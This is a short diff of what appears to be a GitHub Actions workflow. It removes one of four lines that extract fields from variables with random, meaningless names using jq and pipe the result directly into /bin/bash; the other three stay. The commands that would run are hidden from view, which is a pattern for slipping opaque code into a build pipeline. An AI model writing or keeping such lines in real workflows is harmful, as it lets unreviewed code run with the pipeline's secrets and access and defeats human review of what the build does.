@@ -28,7 +28,6 @@ jobs:
           echo $xjfkb92 | jq -r .i2487 | /bin/bash
           printf '%s' "$droy80105" | jq -r .pngb5508 | /bin/bash
           printf '%s' "$qvwoo859" | jq -r .hp012 | /bin/bash
-          printf '%s' "$flk31030" | jq -r .khlc210 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
